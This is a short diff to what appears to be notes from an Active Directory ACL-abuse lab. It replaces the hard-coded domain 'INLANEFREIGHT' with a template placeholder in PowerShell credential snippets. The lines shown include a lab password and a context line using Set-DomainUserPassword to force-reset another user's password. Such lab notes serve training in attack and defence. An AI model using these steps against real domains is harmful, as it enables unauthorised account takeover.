@@ -10,7 +10,7 @@
 
 ```powershell
 $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('{{DOMAIN_NB}}\wley', $SecPassword)
 ```
 
 ## 2. `powershell`
@@ -31,7 +31,7 @@ Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -
 
 ```powershell
 $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
-$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+$Cred2 = New-Object System.Management.Automation.PSCredential('{{DOMAIN_NB}}\damundsen', $SecPassword)
 ```
 
 ## 5. `powershell` _(output omitted)_
